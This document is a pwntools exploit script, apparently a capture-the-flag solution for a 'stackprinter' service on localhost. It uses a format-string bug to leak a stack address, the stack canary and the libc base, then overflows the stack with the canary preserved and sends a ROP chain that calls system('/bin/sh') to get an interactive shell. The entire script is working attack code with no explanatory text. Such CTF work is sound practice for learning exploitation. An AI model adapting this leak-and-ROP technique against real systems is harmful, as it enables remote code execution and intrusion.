from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
# context.log_level = "debug"
context.arch = "amd64"

# io = process("./stackprinter_patched")
# io = gdb.debug("./stackprinter_patched", "b readstr\nc")
io = remote("localhost", 8763)
libc = ELF("./libc-2.31.so")


def fmt(inp):
    io.sendafter(b"Input: ", inp)
    io.recvuntil(b"Output: ")
    r = io.recvlineS(timeout=1)
    if "Quit" in r:
        io.sendline(b"n")
    else:
        io.sendlineafter(b"Quit? ", b"n")
    return r


a, b, c = fmt(b"%1$p,%7$p,%9$p\n").split(",")
buffer = int(a, 16)
canary = int(b, 16)
libc_base = int(c, 16) - 0x270B3
print(f"{buffer = :#x}")
print(f"{canary = :#x}")
print(f"{libc_base = :#x}")
libc.address = libc_base
rop = ROP(libc)
rop.call("system", [next(libc.search(b"/bin/sh\0"))])

fmt(cyclic(504) + p64(canary) + p64(buffer + 8))
io.sendafter(b"Input: ", p64(canary) + b"a" * 8 + rop.chain())
io.sendlineafter(b"Quit? ", b"y")
io.interactive()